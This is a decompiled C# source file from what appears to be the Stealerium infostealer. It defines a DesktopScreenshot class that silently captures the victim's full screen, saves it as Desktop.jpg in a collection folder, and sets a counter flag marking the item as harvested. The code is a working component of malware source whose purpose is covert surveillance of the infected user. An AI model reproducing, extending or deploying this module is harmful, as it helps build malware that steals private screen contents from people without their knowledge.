using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Stealerium.Helpers;

namespace Stealerium.Target.System;

internal static class DesktopScreenshot
{
	public static void Make(string sSavePath)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			Bitmap val = new Bitmap(bounds.Width, bounds.Height);
			try
			{
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					val2.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				((Image)val).Save(sSavePath + "\\Desktop.jpg", ImageFormat.get_Jpeg());
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			Counter.DesktopScreenshot = true;
		}
		catch (Exception ex)
		{
			Logging.Log("DesktopScreenshot >> Failed to create\n" + ex, ret: false);
		}
	}
}
